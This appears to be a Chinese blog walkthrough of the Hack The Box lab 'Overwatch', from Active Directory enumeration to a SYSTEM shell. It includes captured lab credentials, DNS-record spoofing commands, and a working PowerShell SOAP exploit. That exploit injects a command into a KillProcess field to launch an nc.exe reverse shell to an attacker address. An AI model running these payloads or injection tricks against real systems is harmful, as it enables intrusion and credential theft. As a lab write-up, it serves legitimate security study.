---
title: "Overwatch"
date: 2026-04-16 17:54:01 +0800
description: "ai从开始任务到编写exp竟然只用了不到8分钟"
categories:
  - 渗透练习
  - hackthebox
tags:
  - DNS劫持
  - RE
toc: true
---

## Overwatch

### 初始枚举

#### 端口扫描

看起来没有 web 服务，但是有没有给初始权限，看来是匿名枚举起手

```
 ~/Desktop/htb  nmap -sC -sV -T4 $IP                                                                          ✔  02:06:19 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-25 02:06 UTC
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 02:07 (0:00:00 remaining)
Nmap scan report for 10.129.244.81
Host is up (0.065s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-25 02:06:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-25T02:06:45+00:00
|_ssl-date: 2026-02-25T02:07:25+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=2/25%Time=699E5934%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x02\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-25T02:06:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.20 seconds
```

那就先做准备工作，添加 hosts 和统一时间

```bash
sudo nxc smb $IP -u '' -p '' --generate-hosts-file /etc/hosts
tail -n 2 /etc/hosts
sudo ntpdate $IP
```



#### SMB匿名枚举

尝试匿名枚举，但是好像不允许

```bash
nxc smb $IP -M spider_plus
```

smbclient允许匿名枚举，很奇怪

```bash
smbclient //$IP/software$ --no-pass
```

这里好像涉及到两个工具使用的协议不一样，这台机器可能禁用空用户名建立 `session` ，但是允许 `guest` 建立（即使同样没有密码），所以 `nxc` 要枚举的话改成这样，当然也算验证了只有 `//$IP/software$/Monitoring` 允许访问

```bash
nxc smb $IP -u 'guest' -p '' -M spider_plus

mkdir -p workspace/artifacts/recon/spider
nxc smb $IP -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER='workspace/artifacts/recon/spider' EXCLUDE_FILTER='print$,ipc$'
```

![image-20260416161701235](/assets/img/posts/overwatch/image-20260416161701235.png)



#### 反编译获得凭证

把 `overwatch.exe` 拖下来，有个这么一段伪代码

实际上就是去读用户的sqlite文件并尝试连接和读数据，接着看，很容易就能找到这段连接信息

```
aServerLocalhos:                        // DATA XREF: MonitoringService__.ctor+1↑o
                                        // Program__CheckEdgeHistory+29↑o
    text "UTF-16LE", "Server=localhost;Database=SecurityLogs;User Id=sqls"
    text "UTF-16LE", "vc;Password=TI0LKcfHzZw1Vv;",0
```

由于是 `Mono/.NET` ，用 `dnspy` 看更清晰

![image-20260225114235196](/assets/img/posts/overwatch/image-20260225114235196.png)



#### mssql

尝试连接一下数据库

```bash
impacket-mssqlclient sqlsvc:'TI0LKcfHzZw1Vv'@$IP -windows-auth -port 6520
```

没有 `xp_cmdshell` ，也不是管理员权限，数据库里也没有别的信息，但是有一个链接的数据库

```mssql
select srvname from sysservers;

EXECUTE ('whoami') at SQL07;
```

尝试利用这个链接数据库执行命令，但是连接超时了

![image-20260416162314909](/assets/img/posts/overwatch/image-20260416162314909.png)



### 获得初始立足点

#### DNS欺骗获得用户凭据

既然有连接，可以尝试 DNS 欺骗，看看连接的请求

```bash
sudo responder -I tun0 -v
sudo apt install krbrelayx
dnstool -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' -d 10.10.16.26 -r SQL07 -a add -t A -dc-ip $IP $IP
```

不知道为什么这里我报错了，让 gpt 改了一下脚本

```bash
perl -0pi -e 's@def get_next_serial\(dnsserver, dc, zone, tcp\):.*?def ldap2domain@def get_next_serial(dnsserver, dc, zone, tcp):\n    dnsresolver = dns.resolver.Resolver()\n    if dnsserver:\n        server = dnsserver\n    else:\n        server = dc\n\n    try:\n        socket.inet_aton(server)\n        dnsresolver.nameservers = [server]\n    except socket.error:\n        pass\n\n    try:\n        res = dnsresolver.resolve(zone, '\''SOA'\'', tcp=tcp)\n        for answer in res:\n            return answer.serial + 1\n    except Exception as e:\n        print_m(f\"SOA lookup failed for {zone}: {e}; falling back to static serial\")\n        return 1\n\ndef ldap2domain@sm' dnstool.py

PYTHONPATH=/usr/share/krbrelayx python3 ./dnstool.py -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' -d 10.10.16.26 -r SQL07 -a add -t A -dc-ip $IP $IP

# dnstool -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' -r SQL07 -a ldapdelete -dc-ip $IP $IP
```

![image-20260416163807845](/assets/img/posts/overwatch/image-20260416163807845.png)

成功捕获到新的数据库凭证 `sqlmgmt:bIhBbzMMnB82yx`

![image-20260416163830859](/assets/img/posts/overwatch/image-20260416163830859.png)



#### user shell & user flag

可以利用这个凭据通过 winrm 认证

```bash
evil-winrm -i $IP -u sqlmgmt -p bIhBbzMMnB82yx
```

![image-20260416164720955](/assets/img/posts/overwatch/image-20260416164720955.png)



### 提权

通过我们前面通过 SMB 匿名枚举到的 `overwatch.exe.config` ，可以发现这个程序开放在8000端口

```xml
<baseAddresses>
	<add baseAddress="http://overwatch.htb:8000/MonitorService" />
</baseAddresses>
```

涉及一些 RE 的知识，但是我并不熟悉和了解，直接让 ai 帮我去分析了

那我还能说什么呢，只用了8分钟

![image-20260416170018647](/assets/img/posts/overwatch/image-20260416170018647.png)



#### root shell & root flag

exp

```powershell
function OW {
    param([string]$Cmd)

    $esc = [System.Security.SecurityElement]::Escape($Cmd)
    $body = @"
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>$esc</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
"@

    $urls = @(
      "http://127.0.0.1:8000/MonitorService",
      "http://overwatch.htb:8000/MonitorService"
    )

    foreach($u in $urls){
        try{
            $r = Invoke-WebRequest -Uri $u -Method POST -ContentType "text/xml; charset=utf-8" -Headers @{SOAPAction='"http://tempuri.org/IMonitoringService/KillProcess"'} -Body $body -UseBasicParsing -TimeoutSec 10
            [xml]$x = $r.Content
            $ns = New-Object System.Xml.XmlNamespaceManager($x.NameTable)
            $ns.AddNamespace("t","http://tempuri.org/")
            return ($x.SelectSingleNode("//t:KillProcessResult",$ns)).InnerText
        } catch {}
    }
    return "[-] request failed on all endpoints"
}

OW 'dummy -ErrorAction SilentlyContinue; C:\Users\sqlmgmt\Documents\nc.exe 10.10.16.26 4444 -e cmd; #'
```

![image-20260416172547553](/assets/img/posts/overwatch/image-20260416172547553.png)





### 复盘

先来看看什么是链接服务器

简单来说，就是当前这台 `SQL Server` 里配置了一个到另一台服务器的远程连接入口。所以我们可以让当前的数据库先连接到 `SQ07` 上面，再执行 `SQL` 语句，而这个连接过程是会携带凭证的，我们这里通过劫持获得了用户凭证



当然，还是要回来看看这个程序是个怎么回事

配置文件暴露了一个 `IMonitoringService` 

反编译后，查看 `IMonitoringService` 的接口定义，发现有 `StartMonitoring()` ，`StopMonitoring()` ，`KillProcess(string **processName**)`

![image-20260416174811579](/assets/img/posts/overwatch/image-20260416174811579.png)

其中的 `KillProcess` 接口存在漏洞

```c#
// Token: 0x06000009 RID: 9 RVA: 0x000021A8 File Offset: 0x000003A8
	public string KillProcess(string processName)
	{
		string psCommand = "Stop-Process -Name " + processName + " -Force";
		string result;
		try
		{
			using (Runspace runspace = RunspaceFactory.CreateRunspace())
			{
				runspace.Open();
				using (Pipeline pipeline = runspace.CreatePipeline())
				{
					pipeline.Commands.AddScript(psCommand);
					pipeline.Commands.Add("Out-String");
					Collection<PSObject> collection = pipeline.Invoke();
					runspace.Close();
					StringBuilder output = new StringBuilder();
					foreach (PSObject obj in collection)
					{
						output.AppendLine(obj.ToString());
					}
					result = output.ToString();
				}
			}
		}
		catch (Exception ex)
		{
			result = "Error: " + ex.Message;
		}
		return result;
	}
```

整体流程：

1. 拼接 `PowerShell` 命令
    把用户输入直接拼到 `Stop-Process -Name ... -Force` 后面。

2. 创建 `PowerShell Runspace`

   ```
   RunspaceFactory.CreateRunspace()
   ```

   相当于在程序里开一个 `PowerShell` 执行环境。

3. 创建 `Pipeline` 并执行脚本

   ```c#
   pipeline.Commands.AddScript(psCommand);
   pipeline.Commands.Add("Out-String");
   Collection<PSObject> collection = pipeline.Invoke();
   ```

   就是把刚才那条 `PowerShell` 命令丢进去跑，再把输出转成字符串。

4. 收集输出并返回

   把执行结果拼成文本返回。

5. 如果报错，就返回异常信息

   ```c#
   result = "Error: " + ex.Message;
   ```

需要注意的是 `pipeline.Commands.AddScript(psCommand);` 的意思是把整个拼出来的字符串当成 `PowerShell` 脚本执行，而且没有对用户输入进行任何的过滤转义，所以我们能通过插入分号、注释符之类的把我们的命令拼接进去

```powershell
Stop-Process -Name dummy -ErrorAction SilentlyContinue; 你的命令; # -Force
```
